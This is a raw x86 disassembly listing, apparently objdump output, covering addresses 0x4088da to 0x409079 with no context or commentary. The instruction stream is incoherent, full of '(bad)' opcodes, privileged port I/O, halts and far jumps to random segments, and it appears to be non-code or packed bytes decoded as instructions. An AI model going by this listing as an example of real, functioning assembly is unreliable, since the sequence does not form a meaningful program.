  4088da:	and    DWORD PTR [esp+esi*1-0x1b],edx
  4088de:	and    al,0xfe
  4088e0:	xchg   ebp,eax
  4088e1:	jo     0x408957
  4088e3:	xor    DWORD PTR [ebp-0x6f],ebx
  4088e6:	jbe    0x40892d
  4088e8:	lock (bad) 
  4088ea:	xor    cl,BYTE PTR [ebp+0x17]
  4088ed:	adc    bh,BYTE PTR [ecx-0x60f057c2]
  4088f3:	add    ebp,DWORD PTR [esi-0x514dc4d]
  4088f9:	sbb    al,0x5f
  4088fb:	push   esi
  4088fc:	mov    ebx,0x95237d7b
  408901:	mov    ebx,0x7d47572e
  408906:	mov    al,dl
  408908:	push   es
  408909:	scas   eax,DWORD PTR es:[edi]
  40890a:	lods   eax,DWORD PTR ds:[esi]
  40890b:	mov    ds:0xfd2f1574,al
  408910:	std    
  408911:	out    dx,eax
  408912:	stc    
  408913:	or     BYTE PTR [esi],0xf3
  408916:	dec    edx
  408917:	std    
  408918:	(bad)  
  408919:	in     eax,0x5d
  40891b:	jle    0x40890d
  40891d:	dec    ecx
  40891e:	mov    bh,0x0
  408920:	icebp  
  408921:	clc    
  408922:	push   ss
  408923:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  408924:	ds sbb cl,BYTE PTR cs:[edx-0x6dbc70fa]
  40892c:	sub    dl,BYTE PTR [esi-0x342a4e9b]
  408932:	xor    al,0x21
  408934:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  408935:	sbb    BYTE PTR [eax+0x68bb13af],dl
  40893b:	leave  
  40893c:	out    0x7a,eax
  40893e:	mov    es,ebx
  408940:	mov    bl,0xa
  408942:	(bad)  
  408943:	xchg   edi,eax
  408944:	fnstcw WORD PTR [esi+ebx*2]
  408947:	mov    ch,0x4b
  408949:	hlt    
  40894a:	push   0xbe6c96f1
  40894f:	xchg   esp,eax
  408950:	int    0x15
  408952:	push   edx
  408953:	test   al,0x14
  408955:	out    dx,eax
  408956:	mov    edx,0x8a4fe438
  40895b:	popf   
  40895c:	xchg   ecx,eax
  40895d:	adc    DWORD PTR [esi-0x10],0x5f057cdd
  408964:	push   ds
  408965:	(bad)  
  408966:	hlt    
  408967:	fdivr  QWORD PTR [ebx+0x1d]
  40896a:	push   ebp
  40896b:	jmp    0xe357:0x99c0f131
  408972:	fdivr  DWORD PTR [ecx-0x2d4d5850]
  408978:	push   esp
  408979:	mov    bl,0x10
  40897b:	jno    0x4089f9
  40897d:	xchg   edi,eax
  40897e:	gs mov ah,0xc9
  408981:	clc    
  408982:	pushf  
  408983:	enter  0x3379,0xb2
  408987:	push   ebx
  408988:	adc    BYTE PTR [ebx+ecx*8+0x3e],dl
  40898c:	xor    eax,0x4af66dc3
  408991:	cmc    
  408992:	icebp  
  408993:	jle    0x40897f
  408995:	push   edi
  408996:	mov    dh,0x6e
  408998:	ins    BYTE PTR es:[edi],dx
  408999:	jecxz  0x4089f2
  40899b:	jmp    0xa7e1:0x5fc2d822
  4089a2:	or     ebx,DWORD PTR [ebx+0x48651b8d]
  4089a8:	and    edi,ebp
  4089aa:	jl     0x4089a2
  4089ac:	mov    DWORD PTR [ecx+0x14],edx
  4089af:	(bad)  
  4089b0:	aaa    
  4089b1:	arpl   WORD PTR ds:0xc0ee8f20,si
  4089b7:	shr    DWORD PTR [eax],0x62
  4089ba:	icebp  
  4089bb:	ds into 
  4089bd:	lahf   
  4089be:	mov    ds:0xdb83f1c9,eax
  4089c3:	(bad)  [ebp+0x4dc24aab]
  4089c9:	ins    DWORD PTR es:[edi],dx
  4089ca:	or     al,BYTE PTR [eax+0x1a]
  4089cd:	jp     0x408a25
  4089cf:	cmc    
  4089d0:	sbb    DWORD PTR [esi+0x6b],ebx
  4089d3:	mov    ebx,0xa9e1bb97
  4089d8:	addr16 jbe 0x4089f1
  4089db:	mov    ebp,0x77c78e07
  4089e0:	je     0x4089ad
  4089e2:	rcr    BYTE PTR [eax-0x7d],1
  4089e5:	jno    0x4089fd
  4089e7:	mov    edx,DWORD PTR [ecx-0x1fde8e5c]
  4089ed:	adc    esp,edx
  4089ef:	dec    ebp
  4089f0:	repz idiv BYTE PTR [edi-0x5aaaa886]
  4089f7:	sub    BYTE PTR [ebp+0x7e004a8e],cl
  4089fd:	bound  ebx,QWORD PTR [esi+0x49]
  408a00:	(bad)  
  408a01:	fadd   DWORD PTR ds:0xe61d7345
  408a07:	addr16 pop esi
  408a09:	dec    ebp
  408a0a:	pop    ds
  408a0b:	shl    BYTE PTR [ecx-0x11],1
  408a0e:	scas   eax,DWORD PTR es:[edi]
  408a0f:	jne    0x408a45
  408a11:	lds    ebx,FWORD PTR [ebx-0x604a6bd]
  408a17:	test   eax,0xff3107a1
  408a1c:	xchg   edx,eax
  408a1d:	jae    0x408a62
  408a1f:	sbb    eax,0xb0484aa9
  408a24:	call   0x974a8d92
  408a29:	mov    esi,0x787ccff6
  408a2e:	jmp    0x258c:0xbe557897
  408a35:	xor    dh,al
  408a37:	scas   al,BYTE PTR es:[edi]
  408a38:	adc    BYTE PTR ds:0x8709d066,al
  408a3e:	jne    0x408a8b
  408a40:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  408a41:	stos   BYTE PTR es:[edi],al
  408a42:	sub    dh,BYTE PTR [ebx-0x69]
  408a45:	inc    ebp
  408a46:	jge    0x408a6f
  408a48:	out    0x29,eax
  408a4a:	or     ebp,DWORD PTR [ecx+0x44a5b61a]
  408a50:	pop    esi
  408a51:	loop   0x408a2d
  408a53:	mov    cl,0xf5
  408a55:	repnz out 0x15,al
  408a58:	test   dh,ch
  408a5a:	inc    esp
  408a5b:	cld    
  408a5c:	lock in al,dx
  408a5e:	test   BYTE PTR [esi-0x4911f6f6],bh
  408a64:	cmp    al,0x38
  408a66:	xor    al,0x7c
  408a68:	and    ecx,DWORD PTR [edx+0x71333d8b]
  408a6e:	or     eax,0xd21e2042
  408a73:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  408a74:	cmp    esp,ebx
  408a76:	bound  ebp,QWORD PTR [esi]
  408a78:	mov    eax,ds:0x87736281
  408a7d:	push   ds
  408a7e:	sbb    eax,0xaf440165
  408a83:	sub    ebp,DWORD PTR [eax+ecx*4+0x5afa5fe2]
  408a8a:	jle    0x408a57
  408a8c:	jecxz  0x408a32
  408a8e:	shl    BYTE PTR [ecx-0xd],cl
  408a91:	mov    al,0x8a
  408a93:	into   
  408a94:	inc    ebp
  408a95:	sub    DWORD PTR [edx+0x56],0x1d0d853d
  408a9c:	shl    BYTE PTR [edx+0x18572d45],0xec
  408aa3:	dec    ebp
  408aa4:	sub    BYTE PTR [edi-0x135e902c],cl
  408aaa:	dec    ebp
  408aab:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  408aac:	scas   eax,DWORD PTR es:[edi]
  408aad:	test   DWORD PTR ds:0x8d9c5277,0x7a46b83a
  408ab7:	dec    esp
  408ab8:	mov    ecx,0xce094321
  408abd:	dec    edi
  408abe:	pop    esp
  408abf:	clc    
  408ac0:	xchg   BYTE PTR [ecx],ah
  408ac2:	jp     0x408acb
  408ac4:	pop    ebx
  408ac5:	bound  esi,QWORD PTR [edx]
  408ac7:	repnz bound esp,QWORD PTR ds:0x4dc539e2
  408ace:	mov    bh,ch
  408ad0:	repnz push ebx
  408ad2:	jb     0x408a55
  408ad4:	and    edx,ebx
  408ad6:	pusha  
  408ad7:	das    
  408ad8:	mov    ch,0xb1
  408ada:	jge    0x408ac8
  408adc:	or     eax,0x9a32476c
  408ae1:	dec    esp
  408ae2:	ss into 
  408ae4:	push   ebp
  408ae5:	aad    0xa3
  408ae7:	add    bh,ch
  408ae9:	fdivr  st(0),st
  408aeb:	inc    edi
  408aec:	jge    0x408ac4
  408aee:	mov    bl,cl
  408af0:	fnstcw WORD PTR [esi-0x2f]
  408af3:	or     BYTE PTR [edi+0x52],0x94
  408af7:	pop    ecx
  408af8:	fsubr  QWORD PTR [eax+ecx*1+0x5eb35e3c]
  408aff:	push   es
  408b00:	pop    ecx
  408b01:	and    dh,BYTE PTR [ebp-0x49ec66ba]
  408b07:	xchg   BYTE PTR [edi-0x3282457d],bl
  408b0d:	mov    edx,0x77f59f5c
  408b12:	mov    dh,0x26
  408b14:	dec    ebp
  408b15:	add    ah,BYTE PTR [edx+0xa]
  408b18:	in     al,0x38
  408b1a:	out    0x92,eax
  408b1c:	cmp    ch,BYTE PTR [esi+edx*2-0xa]
  408b20:	inc    edi
  408b21:	jno    0x408b08
  408b23:	cmp    eax,0xf0264825
  408b28:	ins    BYTE PTR es:[edi],dx
  408b29:	inc    edx
  408b2a:	fist   DWORD PTR [ebx+0x2433271e]
  408b30:	cdq    
  408b31:	jbe    0x408afc
  408b33:	inc    ebp
  408b34:	nop
  408b35:	cmp    eax,0x6d013c2e
  408b3a:	scas   al,BYTE PTR es:[edi]
  408b3b:	mov    edx,0x637a29a1
  408b40:	out    0x57,al
  408b42:	mov    BYTE PTR [edx+ebx*8-0x5a],dl
  408b46:	sahf   
  408b47:	rcr    DWORD PTR [edx-0x28],cl
  408b4a:	bound  ebx,QWORD PTR [ebp+0x20a52fbd]
  408b50:	dec    esi
  408b51:	fwait
  408b52:	popf   
  408b53:	arpl   WORD PTR [ebp+0x21],dx
  408b56:	push   ds
  408b57:	adc    eax,0x69c8690a
  408b5c:	retf   0xe668
  408b5f:	mov    esp,0xefb15567
  408b64:	sahf   
  408b65:	pop    edx
  408b66:	jbe    0x408bd5
  408b68:	not    BYTE PTR [ecx]
  408b6a:	adc    BYTE PTR [eax+0x3d],dh
  408b6d:	mov    bl,0x69
  408b6f:	mov    bh,BYTE PTR [ebp-0x71c47109]
  408b75:	xchg   BYTE PTR [ebx-0x63],cl
  408b78:	mov    cl,0x17
  408b7a:	imul   ecx,DWORD PTR [eax+0x6f],0xe50ed02a
  408b81:	pop    ecx
  408b82:	cli    
  408b83:	in     al,0xbc
  408b85:	mov    esi,0x3b2943a5
  408b8a:	les    eax,FWORD PTR ds:0xc7f46862
  408b90:	adc    al,0x64
  408b92:	fisttp DWORD PTR [eax]
  408b94:	xchg   edi,eax
  408b95:	gs mov bh,0x80
  408b98:	and    BYTE PTR [ebx-0x41],ah
  408b9b:	pop    ebp
  408b9c:	data16 xor al,0x89
  408b9f:	ss push esp
  408ba1:	test   eax,0x38ca49fc
  408ba6:	stc    
  408ba7:	popa   
  408ba8:	aaa    
  408ba9:	sbb    BYTE PTR [ebp-0x11f497a],ch
  408baf:	stos   BYTE PTR es:[edi],al
  408bb0:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  408bb1:	sub    cl,dl
  408bb3:	fs and dl,BYTE PTR cs:[esi+esi*4]
  408bb8:	icebp  
  408bb9:	std    
  408bba:	mov    ch,0x5b
  408bbc:	ds mov ebp,0x6c435e42
  408bc2:	cmc    
  408bc3:	fimul  DWORD PTR [edi+0x54]
  408bc6:	xchg   esp,eax
  408bc7:	cmp    al,0xb5
  408bc9:	pop    esi
  408bca:	stos   BYTE PTR es:[edi],al
  408bcb:	aaa    
  408bcc:	loopne 0x408b97
  408bce:	ins    BYTE PTR es:[edi],dx
  408bcf:	lods   eax,DWORD PTR ds:[esi]
  408bd0:	pop    edi
  408bd1:	push   esi
  408bd2:	and    BYTE PTR [ecx-0x1b],al
  408bd5:	arpl   WORD PTR [ecx],di
  408bd7:	sub    DWORD PTR gs:[eax+0x32],esi
  408bdb:	jecxz  0x408ba5
  408bdd:	pop    eax
  408bde:	xchg   ecx,eax
  408bdf:	dec    edi
  408be0:	iret   
  408be1:	sub    dh,BYTE PTR [ebx-0x4e9a7951]
  408be7:	or     ah,ah
  408be9:	int    0x8f
  408beb:	test   BYTE PTR [ebx+esi*2-0x4e2e9ef4],ch
  408bf2:	mov    ah,0xcd
  408bf4:	test   BYTE PTR [esi-0x8],bl
  408bf7:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  408bf8:	push   cs
  408bf9:	mov    ah,0x48
  408bfb:	(bad)  
  408bfc:	jns    0x408c6a
  408bfe:	add    eax,0xd3a7f8
  408c03:	fdiv   DWORD PTR [eax-0x22ae348d]
  408c09:	arpl   WORD PTR cs:[esi-0x3cc7964a],bp
  408c10:	inc    eax
  408c11:	mov    esp,0xfe79990
  408c16:	popf   
  408c17:	call   0xc03d:0x12c909bd
  408c1e:	mov    ds:0xcd4f091a,eax
  408c23:	dec    ecx
  408c24:	mov    eax,ds:0x4c6cd492
  408c29:	div    BYTE PTR es:[ebx-0x51d57a0d]
  408c30:	int3   
  408c31:	and    ch,BYTE PTR [ebp+0x8b31cec]
  408c37:	(bad)  
  408c38:	int3   
  408c39:	jno    0x408c4b
  408c3b:	add    BYTE PTR [eax+0x62275e08],dh
  408c41:	in     al,0x9a
  408c43:	push   cs
  408c44:	sub    ecx,DWORD PTR [eax+eax*1]
  408c47:	jno    0x408be1
  408c49:	inc    ebx
  408c4a:	popa   
  408c4b:	sub    esi,DWORD PTR [edx]
  408c4d:	add    ecx,DWORD PTR [edi+ebp*8]
  408c50:	mov    esp,0xacdc2644
  408c55:	jno    0x408c2e
  408c57:	idiv   DWORD PTR [ebx+0x59]
  408c5a:	jbe    0x408c06
  408c5c:	ins    DWORD PTR es:[edi],dx
  408c5d:	pop    DWORD PTR [ebx+esi*2-0x5faf0f6]
  408c64:	mov    edx,0x41749f14
  408c69:	outs   dx,DWORD PTR ds:[esi]
  408c6a:	add    DWORD PTR [ecx-0x5b02a429],ebx
  408c70:	in     eax,0x17
  408c72:	xchg   edx,eax
  408c73:	ins    WORD PTR es:[edi],dx
  408c75:	ret    
  408c76:	pop    ds
  408c77:	bound  ebx,QWORD PTR [edi+0x57]
  408c7a:	inc    edi
  408c7b:	mov    bh,0xc1
  408c7d:	arpl   WORD PTR es:[edx+edx*1-0xbe12ebc],si
  408c85:	dec    edx
  408c86:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  408c87:	pop    eax
  408c88:	aas    
  408c89:	lods   al,BYTE PTR ds:[esi]
  408c8a:	fiadd  DWORD PTR [ecx+0x4c]
  408c8d:	fild   QWORD PTR [ebx]
  408c8f:	push   ebp
  408c90:	int    0xc3
  408c92:	sti    
  408c93:	(bad)  [edx-0x54]
  408c96:	mov    ah,0x95
  408c98:	mov    al,ds:0x30945ea8
  408c9d:	jb     0x408d14
  408c9f:	retf   0xb2e2
  408ca2:	inc    ebx
  408ca3:	mov    ds:0x11dc8c15,al
  408ca8:	and    ch,BYTE PTR [ebx+0x6ce634df]
  408cae:	es jmp 0xa6ba7c58
  408cb4:	in     eax,0x8f
  408cb6:	dec    ebp
  408cb7:	dec    esi
  408cb8:	in     al,dx
  408cb9:	sub    dl,BYTE PTR [eax-0x1c]
  408cbc:	pushf  
  408cbd:	xchg   ebx,eax
  408cbe:	sbb    cl,BYTE PTR [ecx+0x32]
  408cc1:	pop    es
  408cc2:	mov    edi,0x37de6f1
  408cc7:	rcr    BYTE PTR [ebp+0x12],0xf0
  408ccb:	pop    esp
  408ccc:	cmp    bl,dl
  408cce:	jne    0x408c58
  408cd0:	mov    al,0x4f
  408cd2:	or     al,0x9d
  408cd4:	sub    eax,0xad2cd8fb
  408cd9:	adc    dl,ah
  408cdb:	mov    ebp,edx
  408cdd:	xor    al,0x8c
  408cdf:	(bad)  
  408ce0:	aam    0x61
  408ce2:	push   ecx
  408ce3:	jmp    0x408c6e
  408ce5:	push   esi
  408ce6:	mov    cl,0xac
  408ce8:	dec    ebx
  408ce9:	rol    BYTE PTR [esi],1
  408ceb:	sbb    BYTE PTR [ecx],dh
  408ced:	lock cwde 
  408cef:	nop
  408cf0:	test   al,0x56
  408cf3:	jns    0x408d6b
  408cf5:	fisub  DWORD PTR [edx+edi*1-0x55a5e016]
  408cfc:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  408cfd:	ficomp DWORD PTR [ebp+0x44]
  408d00:	lea    esi,[esi+0x3d]
  408d03:	sub    cl,ch
  408d05:	and    BYTE PTR [ecx],bl
  408d07:	popa   
  408d08:	outs   dx,BYTE PTR ds:[esi]
  408d09:	mov    bl,0xdf
  408d0b:	fisub  DWORD PTR [ebx]
  408d0d:	or     ebx,DWORD PTR ds:0x865644a5
  408d13:	and    eax,0xdea17aeb
  408d18:	push   ecx
  408d19:	sti    
  408d1a:	adc    al,0x7a
  408d1c:	sbb    BYTE PTR [ecx+0xc],dh
  408d1f:	xor    bl,BYTE PTR [ebx+0x71e08fd5]
  408d25:	mov    edi,DWORD PTR ds:0xe5608df4
  408d2b:	add    eax,0xedc14bc2
  408d30:	mov    eax,DWORD PTR [edi+0x1a]
  408d33:	sbb    BYTE PTR [ebx-0x7b],ah
  408d36:	ins    DWORD PTR es:[edi],dx
  408d37:	add    edx,esp
  408d39:	push   0x224f7c4e
  408d3e:	pop    esi
  408d3f:	and    dh,BYTE PTR [ebx]
  408d41:	inc    esi
  408d42:	sub    eax,0x40828137
  408d47:	mov    ds:0xfa754229,al
  408d4c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  408d4d:	ror    cl,0x6c
  408d50:	push   edi
  408d51:	or     edx,DWORD PTR ds:0x9c3124d0
  408d57:	mov    bh,BYTE PTR [esi-0x422e96ec]
  408d5d:	and    esp,esi
  408d5f:	inc    esp
  408d60:	mov    ebp,0x52cf8831
  408d65:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  408d66:	cs pop ecx
  408d68:	mov    eax,ds:0x3b6813a7
  408d6d:	cwde   
  408d6e:	rcl    DWORD PTR [ecx-0xb44e02f],1
  408d74:	ins    DWORD PTR es:[edi],dx
  408d75:	add    dl,BYTE PTR [edx+0x573be21f]
  408d7b:	add    al,0xf9
  408d7d:	adc    cl,BYTE PTR [ecx-0x509e68ef]
  408d83:	pop    ds
  408d84:	in     al,dx
  408d85:	sub    al,0xeb
  408d87:	clc    
  408d88:	scas   al,BYTE PTR es:[edi]
  408d89:	jo     0x408d12
  408d8b:	jmp    0x8050:0x8f8b5b89
  408d92:	cmova  ecx,DWORD PTR [ebx+0x466e8b7d]
  408d99:	xor    edi,DWORD PTR [edi-0x7e5875d7]
  408d9f:	jecxz  0x408d24
  408da1:	or     ecx,DWORD PTR [ebx]
  408da3:	cmp    al,0x98
  408da5:	push   esi
  408da6:	ins    DWORD PTR es:[edi],dx
  408da7:	in     eax,dx
  408da8:	cmp    DWORD PTR [edx],edx
  408daa:	out    0xae,al
  408dac:	push   ds
  408dad:	sti    
  408dae:	sub    eax,0xa89012b2
  408db3:	bound  ecx,QWORD PTR [edi]
  408db5:	das    
  408db6:	not    BYTE PTR cs:[edx+0x1e]
  408dba:	push   es
  408dbb:	push   esi
  408dbc:	int    0xcf
  408dbe:	aaa    
  408dbf:	inc    ecx
  408dc0:	fisub  WORD PTR [ecx]
  408dc2:	test   DWORD PTR [edx+eax*2+0x15bed86c],edi
  408dc9:	push   ebx
  408dca:	loope  0x408e24
  408dcc:	scas   al,BYTE PTR es:[edi]
  408dcd:	sahf   
  408dce:	sar    cl,cl
  408dd0:	cli    
  408dd1:	mul    dh
  408dd3:	out    0x3b,al
  408dd5:	or     ebp,DWORD PTR ds:0xa3fbb754
  408ddb:	cli    
  408ddc:	push   esp
  408ddd:	stos   DWORD PTR es:[edi],eax
  408dde:	es out dx,al
  408de0:	add    eax,0x94ca334b
  408de5:	jnp    0x408e12
  408de7:	adc    al,0xca
  408de9:	xlat   BYTE PTR ds:[ebx]
  408dea:	or     bh,dl
  408dec:	mov    esi,esi
  408dee:	push   edi
  408def:	std    
  408df0:	and    DWORD PTR [ebp*8+0x6f26798e],esi
  408df7:	or     dh,BYTE PTR [ebx+ebx*8-0x39]
  408dfb:	stos   BYTE PTR es:[edi],al
  408dfc:	aaa    
  408dfd:	loop   0x408d84
  408dff:	jl     0x408da8
  408e01:	repnz push ebp
  408e03:	and    BYTE PTR [edx+0x60],0x6
  408e07:	sbb    ah,BYTE PTR [esi-0x79e2fbae]
  408e0d:	ss push es
  408e0f:	sbb    al,bh
  408e11:	clc    
  408e12:	sbb    BYTE PTR [ebx],al
  408e14:	push   cs
  408e15:	lea    ebp,[eax-0x2a]
  408e18:	add    eax,0x7df76c31
  408e1d:	push   0xdce9bdad
  408e22:	inc    edx
  408e23:	test   dl,ah
  408e25:	rcl    DWORD PTR [edi+ebx*4+0x63111326],1
  408e2c:	cdq    
  408e2d:	jne    0x408e2a
  408e2f:	push   edi
  408e30:	jg     0x408e36
  408e32:	cmc    
  408e33:	js     0x408e80
  408e35:	mov    cl,0xb9
  408e37:	push   ecx
  408e38:	in     al,0xc
  408e3a:	pop    edx
  408e3b:	mov    ebp,DWORD PTR [esi]
  408e3d:	retf   
  408e3e:	enter  0x9385,0x22
  408e42:	gs jmp 0x408e38
  408e45:	fimul  DWORD PTR [eax]
  408e47:	sbb    ecx,ebp
  408e49:	xchg   esi,eax
  408e4a:	push   ds
  408e4b:	sub    al,BYTE PTR [edi]
  408e4d:	add    al,dl
  408e4f:	shr    BYTE PTR [edx+0x5e],cl
  408e52:	inc    eax
  408e53:	dec    eax
  408e54:	enter  0x4ef,0x6a
  408e58:	and    dh,ch
  408e5a:	iret   
  408e5b:	std    
  408e5c:	or     al,0xa6
  408e5e:	cmp    cl,BYTE PTR [ebx+0x88fd268]
  408e64:	stc    
  408e65:	xchg   edi,eax
  408e66:	jp     0x408e2d
  408e68:	mov    dh,0xd1
  408e6a:	xor    al,0x1
  408e6c:	xor    BYTE PTR fs:[edi-0x4a],dl
  408e70:	inc    eax
  408e71:	mov    ebp,0xa37cb846
  408e76:	push   0x23
  408e78:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  408e79:	add    edi,DWORD PTR [ebx+0x70]
  408e7c:	imul   ecx,DWORD PTR [ebx-0x7e89a96c],0x7c
  408e83:	lds    ecx,FWORD PTR [esi+edi*8-0x72]
  408e87:	mov    cl,0x1
  408e89:	mov    eax,0xad873392
  408e8e:	or     eax,0xa0ad3535
  408e93:	pop    ecx
  408e94:	dec    eax
  408e95:	pop    ss
  408e96:	dec    esp
  408e97:	(bad)  [eax]
  408e99:	daa    
  408e9a:	pop    ss
  408e9b:	loopne 0x408e21
  408e9d:	push   ebx
  408e9e:	sub    DWORD PTR [esi+edx*8],esi
  408ea1:	(bad)  
  408ea2:	outs   dx,DWORD PTR ds:[esi]
  408ea3:	jge    0x408eec
  408ea5:	sub    dl,BYTE PTR [edx]
  408ea7:	cmp    ebx,edx
  408ea9:	jb     0x408e5e
  408eab:	mov    ds:0xcc707802,eax
  408eb0:	pop    ds
  408eb1:	jbe    0x408e63
  408eb3:	and    al,0xe
  408eb5:	sbb    al,0x63
  408eb7:	cwde   
  408eb8:	cs dec edx
  408eba:	cmp    al,0x7
  408ebc:	jnp    0x408e54
  408ebe:	pop    edi
  408ebf:	inc    edx
  408ec0:	dec    ebp
  408ec1:	test   eax,0x4365c638
  408ec6:	inc    edx
  408ec7:	push   esi
  408ec8:	retf   
  408ec9:	mov    eax,ds:0x5acb6ebb
  408ece:	stos   BYTE PTR es:[edi],al
  408ecf:	sbb    ecx,0x932d4ac7
  408ed5:	int    0x3
  408ed7:	pop    ss
  408ed8:	mov    al,ds:0x4c8afde0
  408edd:	jno    0x408eb9
  408edf:	jmp    0x79e72f3d
  408ee4:	or     BYTE PTR [edi],ch
  408ee6:	adc    DWORD PTR [edi-0x63],ebx
  408ee9:	dec    ebx
  408eea:	hlt    
  408eeb:	mov    ss,WORD PTR [edi]
  408eed:	mov    dh,0x98
  408eef:	cmp    al,0xd1
  408ef1:	cwde   
  408ef2:	push   0xa625bf39
  408ef7:	pop    edi
  408ef8:	xchg   ecx,eax
  408ef9:	mov    ah,0xeb
  408efb:	(bad)  
  408efc:	mov    dl,0x40
  408efe:	pop    edx
  408eff:	(bad)  
  408f00:	outs   dx,DWORD PTR ds:[esi]
  408f01:	out    0x73,eax
  408f03:	mov    dh,0xa7
  408f05:	xchg   edi,eax
  408f06:	push   edx
  408f07:	aaa    
  408f08:	je     0x408f0c
  408f0a:	push   eax
  408f0b:	add    al,0xb
  408f0d:	xchg   edi,eax
  408f0e:	sbb    dh,bh
  408f10:	mov    eax,ds
  408f12:	enter  0xd85c,0x7d
  408f16:	out    dx,eax
  408f17:	mov    ds:0x984da5c3,al
  408f1c:	leave  
  408f1d:	push   edi
  408f1e:	mov    ds:0x6ae1ba2e,eax
  408f23:	push   es
  408f24:	sub    dh,cl
  408f26:	jno    0x408f0b
  408f28:	mov    WORD PTR ds:0x4b8690e5,?
  408f2e:	sahf   
  408f2f:	push   ebx
  408f30:	fwait
  408f31:	call   0x2e6f100
  408f36:	test   DWORD PTR [edi],esp
  408f38:	loopne 0x408f7b
  408f3a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  408f3b:	les    ebp,FWORD PTR [ebx]
  408f3d:	mov    ds:0xded8f592,eax
  408f42:	mov    edx,0x8282180f
  408f47:	mov    WORD PTR [ecx+0x688c524e],gs
  408f4d:	xchg   BYTE PTR [edx+0x38],al
  408f50:	xlat   BYTE PTR ds:[ebx]
  408f51:	mov    ds:0x4a4dd009,eax
  408f56:	popa   
  408f57:	test   al,0x90
  408f59:	jmp    DWORD PTR [ecx-0x27e136a6]
  408f5f:	jo     0x408f8a
  408f61:	cmp    al,0x15
  408f63:	mov    ch,ah
  408f65:	cld    
  408f66:	fwait
  408f67:	add    edx,0xade10436
  408f6d:	sti    
  408f6e:	dec    esi
  408f6f:	dec    eax
  408f70:	xchg   ebp,eax
  408f71:	or     edi,DWORD PTR [eax]
  408f73:	aaa    
  408f74:	cmc    
  408f75:	in     al,dx
  408f76:	push   ebp
  408f77:	pop    ecx
  408f78:	xor    eax,0xed930e5d
  408f7d:	pop    ss
  408f7e:	sbb    BYTE PTR [edx],cl
  408f80:	add    DWORD PTR [eax+0x71ab8c45],esp
  408f86:	leave  
  408f87:	or     ecx,DWORD PTR [edi+0x1]
  408f8a:	icebp  
  408f8b:	out    0x64,al
  408f8d:	loopne 0x408fc1
  408f8f:	imul   esi,edx,0xaf6ca779
  408f95:	and    al,0x39
  408f97:	pop    ecx
  408f98:	adc    DWORD PTR [edx+eax*4-0x64],ecx
  408f9c:	sbb    DWORD PTR [ebp+esi*2+0x3516b9d8],esp
  408fa3:	out    dx,al
  408fa4:	xchg   ebp,eax
  408fa5:	test   al,0x8c
  408fa7:	mov    eax,ds:0xd840a4b
  408fac:	mov    ecx,DWORD PTR [ebp+edi*8+0x61da80bb]
  408fb3:	aam    0xde
  408fb5:	popw   ss
  408fb7:	(bad)  
  408fb8:	loope  0x409014
  408fba:	and    al,0x88
  408fbc:	test   BYTE PTR [edi],bh
  408fbe:	and    dl,BYTE PTR [edi+0x3549e39a]
  408fc4:	xor    al,0xcc
  408fc6:	popf   
  408fc7:	add    al,0x29
  408fc9:	fcom   QWORD PTR [edi-0x16]
  408fcc:	jno    0x408fe8
  408fce:	pop    ebp
  408fcf:	xchg   edi,eax
  408fd0:	lds    esi,FWORD PTR [esi+0x262dde49]
  408fd6:	adc    BYTE PTR [edi-0x7],cl
  408fd9:	(bad)  
  408fda:	and    eax,0xc64f2ea2
  408fdf:	push   0xae612e22
  408fe4:	lods   eax,DWORD PTR ds:[esi]
  408fe5:	xchg   edx,eax
  408fe6:	test   eax,0xfd46b41f
  408feb:	imul   eax,DWORD PTR [edx],0xffffff85
  408fee:	fild   DWORD PTR [eax]
  408ff0:	fs xchg ecx,eax
  408ff2:	pop    ebp
  408ff3:	push   ecx
  408ff4:	stos   BYTE PTR es:[edi],al
  408ff5:	xor    al,0xe4
  408ff7:	xor    BYTE PTR [esi-0x1e],cl
  408ffa:	sub    eax,DWORD PTR [esi]
  408ffc:	(bad)  
  408ffd:	outs   dx,BYTE PTR ds:[esi]
  408ffe:	mov    bh,0xa0
  409000:	push   eax
  409001:	or     DWORD PTR [ecx],0xf159f69
  409007:	aam    0x6a
  409009:	fs out dx,al
  40900b:	enter  0x1ca9,0x7c
  40900f:	sub    bl,BYTE PTR [esi]
  409011:	pop    ds
  409012:	fisub  DWORD PTR [ebx]
  409014:	sub    BYTE PTR [edi],ah
  409016:	data16 and bl,BYTE PTR [ebx-0x4db3fa47]
  40901d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40901e:	clc    
  40901f:	add    DWORD PTR [ebp-0x4f1d7eb2],eax
  409025:	retf   
  409026:	adc    BYTE PTR [ebp-0x5b4bbb17],0xe8
  40902d:	adc    al,0xad
  40902f:	sti    
  409030:	inc    eax
  409031:	(bad)  
  409032:	xor    BYTE PTR [ebp+0x6f],dl
  409035:	lods   al,BYTE PTR ds:[esi]
  409036:	or     DWORD PTR [ebp-0x6d],0xe282dd9
  40903d:	pop    edi
  40903e:	dec    edx
  40903f:	sti    
  409040:	dec    edi
  409041:	int3   
  409042:	cli    
  409043:	sub    eax,0x11ba7481
  409048:	in     al,dx
  409049:	xchg   BYTE PTR ds:0x3817d10d,bh
  40904f:	icebp  
  409050:	jb     0x409063
  409052:	ins    BYTE PTR es:[edi],dx
  409053:	leave  
  409054:	fmul   st,st(1)
  409056:	xchg   al,bl
  409058:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  409059:	mov    esi,DWORD PTR [eax-0x15]
  40905c:	sbb    eax,0xdf24a4f8
  409061:	push   ecx
  409062:	mov    DWORD PTR [ebx+edx*4],ecx
  409065:	fistp  QWORD PTR [ebp-0x42]
  409068:	inc    edx
  409069:	mov    dh,dl
  40906b:	mov    esp,0xf8acc55e
  409070:	packsswb mm6,QWORD PTR [edi+0x2]
  409074:	push   esi
  409075:	lods   eax,DWORD PTR ds:[esi]
  409076:	push   ebx
  409077:	mov    bh,0xfa
  409079:	fadd   st(3),st
